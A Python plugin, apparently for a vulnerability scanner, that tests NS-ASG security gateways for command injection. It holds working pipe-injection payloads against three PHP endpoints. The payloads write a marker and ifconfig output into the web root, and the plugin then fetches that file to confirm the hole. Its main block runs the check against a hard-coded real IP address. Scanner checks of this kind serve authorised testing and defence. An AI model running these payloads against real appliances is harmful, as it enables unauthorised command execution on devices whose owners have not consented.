#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: NS-SAG command execution
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2014-058987
refer: 自挖
description:
    补漏...这下应该全了，不全也不再刷了，交给别人了
'''

def assign(service, arg):
    if service == 'ns-asg':
        return True, arg

def audit(arg):
    payloads = [
        arg + 'admin/detail_tunel.php?type=ikev1&tunnelname=a%20|%20echo%20testvul0>/Isc/third-party/httpd/htdocs/test.txt',
        arg + 'debug/show_logfile.php?filename=a|echo%20testvul1>/Isc/third-party/httpd/htdocs/test.txt'
    ]
    for i in range(len(payloads)):
        payload = payloads[i]
        code, head, res, err, _ = curl.curl2(payload)
        if code != 0:
            verify = arg + 'test.txt'
            code, head, res, err, _ = curl.curl2(verify)
            #print res
            if code==200 and ('testvul'+str(i)) in res:
                security_hole('command execution: ' + payload)
    #有限制的命令执行（不能有空格,,,）
    url = arg + 'protocol/devicestatus/setdevicetime.php?procotalarray[messagecontent]=a|ifconfig>/Isc/third-party/httpd/htdocs/test.txt%20b'
    code, head, res, err, _ = curl.curl2(url)
    if code==200:
        code, head, res, err, _ = curl.curl2(arg+'test.txt')
        if (code==200) and ('Link encap' in res):
            security_hole('Command Execution: ' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ns-asg', 'https://121.28.81.124/')[1])